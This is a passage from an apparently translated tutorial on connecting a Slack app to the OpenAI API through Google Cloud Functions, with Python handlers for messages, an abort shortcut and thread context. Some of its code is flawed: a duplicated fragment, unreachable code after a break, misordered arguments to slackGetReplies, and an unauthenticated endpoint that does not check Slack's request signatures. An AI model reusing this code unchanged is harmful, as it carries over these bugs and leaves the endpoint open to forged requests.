too much; I thought there should be many OpenAI API integration services for Slack Apps, so I just needed to find one and set it up. However, things turned out to be more complicated than expected.A Google search only yielded one official press release from Slack x OpenAI dated March 2023, titled “Why we built the ChatGPT app for Slack,” along with some Beta images:https://www.salesforce.com/news/stories/chatgpt-app-for-slack/It looks like the functionality is very comprehensive and could greatly enhance work efficiency. However, as of January 2024, there has been no release news, and the Beta registration link provided at the end of the article has already expired, leaving no further updates. (Is Microsoft trying to let Teams support it first?)[2024/02/14 Update]: According to Slack’s official news, it seems that the integration with ChatGPT (OpenAI) has likely been abandoned or restructured into Slack AI.Slack AppsDue to the lack of an official App, I turned to search for third-party developer Apps. After searching and trying several, I hit a wall; there weren’t many suitable Apps, and none offered the ability to customize the Key. Each was designed to sell services and make money.Implementing ChatGPT OpenAI API for Slack AppHaving some prior experience in developing Slack Apps, I decided to create one myself. ⚠️Disclaimer⚠️ This article demonstrates how to build a Slack App and quickly use Google Cloud Functions to meet the needs by connecting to the OpenAI API. There are many applications for Slack Apps, and everyone is free to explore. ⚠️⚠️ Google Cloud Functions, as a Function as a Service (FaaS), offers the advantages of convenience, speed, and free quotas. Once the program is written, it can be deployed and executed directly, with automatic scaling. The downside is that the service environment is controlled by GCP, and if the service is not called for a long time, it will enter a sleep mode. When called again, it will experience a Cold Start with longer response times. Additionally, it is more challenging to run multiple services that interact with each other. For more extensive or high-demand usage, it is still recommended to set up a VM (App Engine) to run the service.Final Result Image The complete Cloud Functions Python code and Slack App settings are attached at the end of the article, so those who don’t want to read step by step can quickly check it out.Step 1. Create a Slack AppGo to Slack App:Click “Create New App”Choose “From scratch”Enter “App Name” and select the Workspace to add it to.Once created, go to “OAuth &amp; Permissions” to add the necessary permissions for the Bot.Scroll down to find the “Scopes” section, click “Add an OAuth Scope,” and search to add the following permissions: chat:write im:history im:read im:writeAfter adding the Bot permissions, click on the left “Install App” -&gt; “Install to Workspace”If the Slack App adds any other permissions later, you will need to click “Reinstall” again for them to take effect. But rest assured, the Bot Token will not change due to reinstallation.After setting the Slack Bot Token permissions, go to “App Home”:Scroll down to find the “Show Tabs” section, enable “Messages Tab” and “Allow users to send Slash commands and messages from the messages tab” (if this is not checked, you still won’t be able to send messages, and it will display “Sending messages to this app has been turned off.”)Return to the Slack Workspace, press “Command+R” to refresh the page, and you will see the newly created Slack App and the message input box:At this point, sending messages to the App does not have any functionality yet.Enable Event SubscriptionsNext, we need to enable the event subscription feature for the Slack App, which will hit the API at the specified URL when designated events occur.Add Google Cloud FunctionsFor the Request URL, Google Cloud Functions comes into play.After setting up the project and billing information, click “Create Function”Enter the project name for Function name, and select “Allow unauthenticated invocations” for Authentication, meaning that anyone with the URL can access it. If you cannot create a Function or change Authentication, it means your GCP account does not have complete Google Cloud Functions permissions. You will need to ask your organization administrator to add Cloud Functions Admin permissions in addition to your original role to use it.Runtime: Python 3.8 or highermain.py:import functions_framework@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # You can use print to log execution logs, which can be viewed in Logs # For advanced Logging Level usage, refer to: https://cloud.google.com/logging/docs/reference/libraries print(request_json) # Due to the limitations of FAAS (Cloud Functions), if the service is not called for a long time, it will enter a cold start state upon the next call # Additionally, the OpenAI API request takes a certain amount of time to respond (depending on the response length, it may take nearly a minute to complete) # If Slack does not receive a response within the time limit, it will consider the request lost and will call again # This can cause duplicate requests and responses, so we can set the Response Headers to X-Slack-No-Retry: 1 to inform Slack that even if it does not receive a response within the time limit, it does not need to retry headers = {'X-Slack-No-Retry':1} # If this is a Slack Retry request... ignore it if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) return (\"Access Denied!\", 400, headers)requirements.txt should include the following dependencies:functions-framework==3.*requests==2.31.0openai==1.9.0Currently, it doesn’t have much functionality; it just allows the Slack App to pass the Event Subscriptions verification. You can click “Deploy” to complete the first deployment. ⚠️If you are not familiar with the Cloud Functions editor, you can scroll down to the bottom of the article to see supplementary content.After waiting for the deployment to complete (green check mark), copy the Cloud Functions URL:Paste the Request URL back into the Slack App Enable Events.If there are no issues, “Verified” will appear, completing the verification.What we are doing here is responding to the verification request sent by Slack:{ \"token\": \"Jhj5dZrVaK7ZwHHjRyZWjbDl\", \"challenge\": \"3eZbrw1aBm2rZgRNFdxV2595E9CY3gmdALWMmHkvFXO7tYXAYM8P\", \"type\": \"url_verification\"}By responding with the content of the challenge field, we can pass the verification.After successful activation, scroll down to find the “Subscribe to bot events” section, click “Add Bot User Event,” and add the “message.im” permission.After adding all the necessary permissions, click the “reinstall your app” link at the top to reinstall the Slack App to the Workspace, and the Slack App setup will be complete.You can also go to “App Home” or “Basic Information” to customize the Slack App’s name and profile picture.Basic InformationStep 2. Complete the Integration of OpenAI API and Slack App (Direct Messages)First, we need to obtain the two essential keys: OPENAI API KEY and Bot User OAuth Token. OPENAI API KEY: OpenAI API key page. Bot User OAuth Token: OAuth Tokens for Your WorkspaceHandling Direct Message (IM) Events &amp; Integrating OpenAI API ResponsesWhen a user sends a message to the Slack App, the following Event JSON Payload will be received:{ \"token\": \"XXX\", \"team_id\": \"XXX\", \"context_team_id\": \"XXX\", \"context_enterprise_id\": null, \"api_app_id\": \"XXX\", \"event\": { \"client_msg_id\": \"XXX\", \"type\": \"message\", \"text\": \"Hello\", \"user\": \"XXX\", \"ts\": \"1707920753.115429\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"orfng\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"Hello\" } ] } ] } ], \"team\": \"XXX\", \"channel\": \"XXX\", \"event_ts\": \"1707920753.115429\", \"channel_type\": \"im\" }, \"type\": \"event_callback\", \"event_id\": \"XXX\", \"event_time\": 1707920753, \"authorizations\": [ { \"enterprise_id\": null, \"team_id\": \"XXX\", \"user_id\": \"XXX\", \"is_bot\": true, \"is_enterprise_install\": false } ], \"is_ext_shared_channel\": false, \"event_context\": \"4-XXX\"}Based on the above JSON Payload, we can enhance the Slack message to integrate with the OpenAI API and respond back to the Slack message.**Cloud Functions `main.py`:**```pythonimport functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# The OPENAI API Model being used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # You can simply use print to log runtime logs, which can be viewed in Logs # For advanced Logging Level usage, refer to: https://cloud.google.com/logging/docs/reference/libraries print(request_json) # Due to the limitations of FAAS (Cloud Functions), if the service is not called for a long time, # subsequent calls will enter a cold start state, which may not respond within the 3 seconds required by Slack. # Additionally, the OpenAI API request takes a certain amount of time to respond (depending on the response length, # it may take nearly a minute to complete). # If Slack does not receive a response within the time limit, it considers the request lost and will call again. # This can cause issues with duplicate requests and responses, so we can set the Response Headers to # X-Slack-No-Retry: 1 to inform Slack that even if it does not receive a response within the time limit, # it does not need to retry. headers = {'X-Slack-No-Retry': 1} # If this is a Slack Retry request... ignore it if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # If the event source is the App and the App ID == Slack App ID, it means it is an event triggered by its own Slack App # Ignore and do not process, otherwise it will fall into an infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message (related to messages), app_mention (mentioned).... eventType = request_json['event']['type'] # SubType, e.g., message_changed (edited message), message_deleted (deleted message)... # New messages have no Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # Messages with Sub Type are all message edits, deletions, responses... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message eventText = request_json['event']['text'] # TS of the event message (message ID) eventTS = request_json['event']['event_ts'] # TS of the parent message in the thread of the event message (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to my colleague (https://twitter.com/je_suis_marku) for the support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"When I speak Chinese, I will respond in Traditional Chinese and must conform to commonly used phrases in Taiwan.\"}, {\"role\": \"system\", \"content\": \"When I speak English, I will respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with pleasantries.\"}, {\"role\": \"system\", \"content\": \"There must be a space between Chinese and English. There must also be a space between Chinese characters and any other language characters, including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you do not know the answer, or your knowledge is too outdated, please search online before responding.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (chunked response) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update the message every 0.8 seconds to avoid frequent calls to the Slack Update message API, which could lead to failures or waste Cloud Functions request counts if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result + \"...\") debounceSlackUpdateTime = time.time() except Exception as e: print(e) result += \"...*[An error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\" + endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneReturn to Slack to test:Now you can conduct Q&amp;A with ChatGPT and the OpenAI API.Adding Stream Response Interruption Feature to Save TokensThere are many ways to implement this. If a user inputs a new message while a response is still being generated in the same thread, the previous response can be interrupted, or a shortcut can be clicked to interrupt the response.This article takes adding a “Message Interruption” shortcut as an example.Regardless of the interruption method, the core principle is the same. Since we do not have a database to store the generated messages and their statuses, the implementation relies on the Slack message’s metadata field (which can store custom information within a specified message).When we use the chat.update API Endpoint, if the call is successful, it will return the current message’s text content and metadata. Therefore, we add a check in the OpenAI API Stream -&gt; Slack Update Message code to see if the metadata in the response indicates “interrupt.” If it does, we interrupt the OpenAI Stream Response.First, we need to add a Slack App message ShortcutGo to the Slack App management interface, find the “Interactivity &amp; Shortcuts” section, click to enable it, and use the same Cloud Functions URL.Click “Create New Shortcut” to add a new message Shortcut.Select “On messages.” Name of the action: Stop OpenAI API Response Generation Short Description: Stop OpenAI API Response Generation Callback ID: abort_openai_api (customizable for program identification)After clicking “Create,” remember to click “Save Changes” in the bottom right to save the settings.Click the “reinstall your app” button at the top again for the changes to take effect.Back in Slack, click the “…” in the upper right corner of the message to see the “Stop OpenAI API Response Generation” Shortcut (clicking it now will have no effect).When a user presses the Shortcut on the message, it will send an Event JSON Payload:{ \"type\": \"message_action\", \"token\": \"XXXXXX\", \"action_ts\": \"1706188005.387646\", \"team\": { \"id\": \"XXXXXX\", \"domain\": \"XXXXXX-XXXXXX\" }, \"user\": { \"id\": \"XXXXXX\", \"username\": \"zhgchgli\", \"team_id\": \"XXXXXX\", \"name\": \"zhgchgli\" }, \"channel\": { \"id\": \"XXXXXX\", \"name\": \"directmessage\" }, \"is_enterprise_install\": false, \"enterprise\": null, \"callback_id\": \"abort_openai_api\", \"trigger_id\": \"XXXXXX\", \"response_url\": \"https://hooks.slack.com/app/XXXXXX/XXXXXX/XXXXXX\", \"message_ts\": \"1706178957.161109\", \"message\": { \"bot_id\": \"XXXXXX\", \"type\": \"message\", \"text\": \"The English translation of 高麗菜包 is \\\"cabbage wrap\\\". If you are using it as a dish name, it may sometimes be specified based on the contents of the dish, such as \\\"pork cabbage wrap\\\" or \\\"vegetable cabbage wrap.\\\"\", \"user\": \"XXXXXX\", \"ts\": \"1706178957.161109\", \"app_id\": \"XXXXXX\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"eKgaG\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"The English translation of 高麗菜包 is \\\"cabbage wrap\\\". If you are using it as a dish name, it may sometimes be specified based on the contents of the dish, such as \\\"pork cabbage wrap\\\" or \\\"vegetable cabbage wrap.\\\"\" } ] } ] } ], \"team\": \"XXXXXX\", \"bot_profile\": { \"id\": \"XXXXXX\", \"deleted\": false, \"name\": \"Rick C-137\", \"updated\": 1706001605, \"app_id\": \"XXXXXX\", \"icons\": { \"image_36\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_36.png\", \"image_48\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_48.png\", \"image_72\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_72.png\" }, \"team_id\": \"XXXXXX\" }, \"edited\": { \"user\": \"XXXXXX\", \"ts\": \"1706187989.000000\" }, \"thread_ts\": \"1706178832.102439\", \"parent_user_id\": \"XXXXXX\" }}Complete Cloud Functions main.py:import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# The OPENAI API Model being used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # The Event for the Shortcut will be given from the post payload field # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # You can simply use print to log runtime logs, which can be viewed in Logs # For advanced Logging Level usage, refer to: https://cloud.google.com/logging/docs/reference/libraries print(payload) # Due to the limitations of FAAS (Cloud Functions), if the service is not called for a long time, # subsequent calls will enter a cold start state, which may not respond within the 3 seconds required by Slack. # Additionally, the OpenAI API request takes a certain amount of time to respond (depending on the response length, # it may take nearly a minute to complete). # If Slack does not receive a response within the time limit, it considers the request lost and will call again. # This can cause issues with duplicate requests and responses, so we can set the Response Headers to # X-Slack-No-Retry: 1 to inform Slack that even if it does not receive a response within the time limit, # it does not need to retry. headers = {'X-Slack-No-Retry': 1} # If this is a Slack Retry request... ignore it if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # If the event source is the App and the App ID == Slack App ID, it means it is an event triggered by its own Slack App # Ignore and do not process, otherwise it will fall into an infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message (related to messages), app_mention (mentioned).... eventType = request_json['event']['type'] # SubType, e.g., message_changed (edited message), message_deleted (deleted message)... # New messages have no Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # Messages with Sub Type are all message edits, deletions, responses... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message eventText = request_json['event']['text'] # TS of the event message (message ID) eventTS = request_json['event']['event_ts'] # TS of the parent message in the thread of the event message (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)```markdown# SubType, for example: message_changed (edit message), message_deleted (delete message)...# New messages have no Sub TypeeventSubType = Noneif 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype']if eventType == 'message': # Messages with Sub Type are all about editing, deleting, or being replied to... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message eventText = request_json['event']['text'] # TS of the event message (message ID) eventTS = request_json['event']['event_ts'] # TS of the parent message in the thread (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)# Handle Shortcutif payload and 'type' in payload: payloadType = payload['type'] # If it is a message Shortcut if payloadType == 'message_action': print(payloadType) callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If it is the Shortcut to stop OpenAI API responses if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": {}}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API responses!\") return (\"OK!\", 200, headers) return (\"OK!\", 200, headers)return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to my colleague (https://twitter.com/je_suis_marku) for the support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"When I speak Chinese, I will respond in Traditional Chinese and must conform to commonly used Taiwanese expressions.\"}, {\"role\": \"system\", \"content\": \"When I speak English, I will respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with pleasantries.\"}, {\"role\": \"system\", \"content\": \"There must be a space between Chinese and English. There must also be a space between Chinese characters and any other language characters, including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you do not know the answer, or your knowledge is too outdated, please search online and then respond.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update the message every 0.8 seconds to avoid frequent calls to Slack Update message API, which may lead to failures or waste Cloud Functions request counts if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result + \"...\") debounceSlackUpdateTime = time.time() # If the message has metadata &amp; metadata event_type == aborted, it means this response has been marked as terminated by the user if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Terminated]*\" # Message has been deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\": break await stream.close() except Exception as e: print(e) result += \"...*[An error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Prompt\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\" + endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneReturn to Slack to test:Success! After we complete the Stop OpenAI API Shortcut, the ongoing response will be terminated, and it will respond [Terminated]. Similarly, you can create a Shortcut to delete messages, implementing the deletion of messages sent by the Slack App.Add Context Functionality in the Same ThreadIf a new message is sent in the same thread, it can be treated as a follow-up question to the same issue. At this point, a feature can be added to supplement the new prompt with the previous conversation content.Add slackGetReplies &amp; fill the content into the OpenAI API Prompt:Enhance Cloud Functions main.py:import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# The OPENAI API Model used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # The Event of the Shortcut will be given from the post payload field # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # You can simply use print to log the execution log, which can be viewed in Logs # For advanced Logging Level usage, refer to: https://cloud.google.com/logging/docs/reference/libraries print(payload) # Due to the limitations of FAAS (Cloud Functions), if the service is not called for a long time, the next call may enter a cold start feature, which may not respond within Slack's specified 3 seconds # Additionally, the request to the OpenAI API takes a certain amount of time (depending on the response length, it may take nearly a minute to finish) # If Slack does not receive a response within the time limit, it considers the request lost, and Slack will call again # This can cause duplicate requests and responses, so we can set the Response Headers to X-Slack-No-Retry: 1 to inform Slack that even if it does not receive a response within the time limit, it does not need to retry headers = {'X-Slack-No-Retry': 1} # If it is a Slack Retry request... ignore if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # If the Event source is App and App ID == Slack App ID, it means it is an event triggered by its own Slack App # Ignore and do not process, otherwise it will fall into an infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, for example: message (related to messages), app_mention (mentioned).... eventType = request_json['event']['type'] # SubType, for example: message_changed (edit message), message_deleted (delete message)... # New messages have no Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # Messages with Sub Type are all about editing, deleting, or being replied to... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message eventText = request_json['event']['text'] # TS of the event message (message ID) eventTS = request_json['event']['event_ts'] # TS of the parent message in the thread (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # Handle Shortcut (message) if payload and 'type' in payload: payloadType = payload['type'] # If it is a message Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If it is the Shortcut to stop OpenAI API responses if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": {}}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API responses!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to my colleague (https://twitter.com/je_suis_marku) for the support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"When I speak Chinese, I will respond in Traditional Chinese and must conform to commonly used Taiwanese expressions.\"}, {\"role\": \"system\", \"content\": \"When I speak English, I will respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with pleasantries.\"}, {\"role\": \"system\", \"content\": \"There must be a space between Chinese and English. There must also be a space between Chinese characters and any other language characters, including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you do not know the answer, or your knowledge is too outdated, please search online and then respond.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventTS, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # If it is a Slack App (OpenAI API Response), mark it as assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # User's message content is marked as user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (Segmented Response) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update the message every 0.8 seconds to avoid frequent calls to the Slack Update Message API, which could lead to failures or waste Cloud Functions request counts if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # If the message has metadata &amp; metadata event_type == aborted, it means this response has been marked as terminated by the user if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Terminated]*\" # The message has been deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\": break await stream.close() except Exception as e: print(e) result += \"...*[An error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Prompt\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, 